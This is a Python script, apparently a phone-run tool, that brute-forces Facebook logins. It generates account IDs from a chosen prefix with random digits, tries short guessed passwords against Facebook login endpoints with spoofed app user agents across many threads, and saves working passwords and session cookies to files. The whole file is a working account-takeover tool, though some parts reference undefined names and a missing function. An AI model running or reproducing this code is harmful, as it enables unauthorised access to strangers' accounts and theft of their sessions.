#si6xd
import os
import sys
import re
import bs4
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import time,subprocess,platform,uuid
import random
import base64
import string
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
try:os.mkdir('/sdcard/j4rvis')
except:pass
R = '\x1b[1;91m' 
OR = '\033[1;35m'
G = '\x1b[1;92m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m'
B = '\033[1;34m'
W = '\033[1;97m'
cyan="\033[1;36m"
ugnn = []
redmi=[]
uge = []
loop = 0
oks = []
gen = []
logo = (f"""                                        
                               ,--.     
 ,---. ,--.--.  ,--,--.  ,---. |  |,-.  
| .--' |  .--' ' ,-.  | | .--' |     /  
\ `--. |  |    \ '-'  | \ `--. |  \  \  
 `---' `--'     `--`--'  `---' `--'`--' 
                                                              
\033[1;97m———————————————————————————————————————————————""")

myid=uuid.uuid4().hex[:5].upper() 
def m():
    os.system('clear');print(logo)
    print(f'{Y}[{W}1{Y}] {W}HOST 1 [Web]')
    print(f'{Y}[{W}2{Y}] {W}HOST 2 [IOS]')
    print(47*"—")
    m = input(f'{Y}[{W}?{Y}] {W}Choose Method : ')
    if m == '1':
        main()
    elif m == '2':
        mainn()
    
def main():
    os.system('clear')
    print(logo)
    code = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
    #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
   # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
    #code = random.choice([code1,code2,code3])
    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=80) as Submits:
        print(47*"\x1b[1;97m—") 
        for next in gen:
            ids = code + next
            mk = ids[:6]
            xx = ids[:7]
            v = ids[:8]
            b = next[:6]  
            passlist = [mk,xx,'57273200',v,'57575751','57575752']
            Submits.submit(cracker,ids,passlist)

def convert(cookie):
    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
    return(str(cok))

def cracker(ids,passlist):
    global loop,oks,cps
    session = requests.Session()
    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            #nip=random.choice(proxsi)
            #proxs= {'http': 'socks4://'+nip}
            #moz = random.choice(usergent)
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(6,14)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
            requu1 = session.get(url1)
            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
            #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            headers = {"authority": "mbasic.facebook.com",
            "method": "POST",
            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5479901a-9393-4dd1-8689-a89daffb52fc%26tp%3Dunspecified%26cbt%3D1734959969869&lwv=100",
            "scheme": "https",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "dpr": "3",
            "origin": "https://mbasic.facebook.com",
            "referer": "https://www.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5479901a-9393-4dd1-8689-a89daffb52fc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DQs4jjwDqLWx2dfd5UDgv8wGjbRRQFHyA8C2iTdY5%23_%3D_&display=page&locale=bn_IN&pl_dbl=0",
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": "\"\"",
            "sec-ch-ua-platform": "\"Linux\"",
            "sec-ch-ua-platform-version": "\"\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": us,
            "viewport-width": "980"}             
            response = session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
            #print(headers)
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                xs_value = None
                for part in kuki.split(';'):
                    if part.startswith('xs='):
                        xs_value = part.split('=', 1)[1]
                        break
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if xs_value and xs_value.rstrip(';').endswith('-1'):
                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
                        oks.append(ids)
                        break
                    else:
                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
                        oks.append(ids)
                        break
            elif "checkpoint" in log_cookies:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        #print(f"\nError: {e}")
        pass

def convert(cookie):
    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
    return(str(cok))            

def crackerr(ids,passlist):
    global loop,oks,cps
    session = requests.Session()
    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            #nip=random.choice(proxsi)
            #proxs= {'http': 'socks4://'+nip}
            moz = random.choice(usragt)
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(6,14)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
            url1 = "https://m.prod.facebook.com/"
            head = {"authority": "m.prod.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "dpr": "3",
            "sec-ch-prefers-color-scheme": "light",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": us,
            "viewport-width": "980"}
            requu1 = session.get(url1,headers=head)
            log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
            headers = {"authority": "www.facebook.com",
            "method": "POST",
            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
            "scheme": "https",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "content-type": "application/x-www-form-urlencoded",
            "dpr": "3",
            "origin": "https://www.facebook.com",
            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": "\"\"",
            "sec-ch-ua-platform": "\"Linux\"",
            "sec-ch-ua-platform-version": "\"\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
           "sec-fetch-site": "same-origin",
           "sec-fetch-user": "?1",
           "upgrade-insecure-requests": "1",
           "user-agent": us,
           "viewport-width": "980"}
            response = session.post(url,data=log_data,headers=headers,allow_redirects=False)
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                xs_value = None
                for part in kuki.split(';'):
                    if part.startswith('xs='):
                        xs_value = part.split('=', 1)[1]
                        break
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if xs_value and xs_value.rstrip(';').endswith('-1'):
                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
                        oks.append(ids)
                        break
                    else:
                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
                        oks.append(ids)
                        break
            elif "checkpoint" in log_cookies:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        #print(f"\nError: {e}")
        pass


m()
